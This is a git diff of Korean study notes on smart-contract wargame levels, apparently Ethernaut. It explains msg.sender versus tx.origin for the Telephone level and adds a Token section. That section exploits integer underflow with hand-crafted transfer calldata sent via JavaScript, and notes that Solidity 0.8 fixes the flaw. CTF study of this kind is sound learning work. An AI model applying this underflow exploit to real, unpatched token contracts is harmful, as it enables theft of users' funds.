@@ -41,6 +41,7 @@ contract CoinFlipCaller {
 
 ### Telephone
 msg.sender = 현재 함수를 직접 호출한 address
+
 tx.origin = 트랜잭션 최초로 호출한 address
 ```
 // SPDX-License-Identifier: MIT
@@ -58,4 +59,18 @@ contract TakeTelephone {
         if(!success) revert();
     }
 }
+```
+
+### Token
+underflow를 활용한 토큰 탈취.
+0.8부터는 해당 취약점은 개선됨.
+```
+const toAddress = '0xdead';
+const toAddressPadded = '0'.repeat(24) + toAddress.slice(2).padStart(40, '0');
+
+const value = 21;
+const valuePadded = value.toString(16).padStart(64, '0');
+
+const data = "0xa9059cbb" + toAddressPadded + valuePadded;
+await sendTransaction({from:player, to:contract.address, data});
 ```
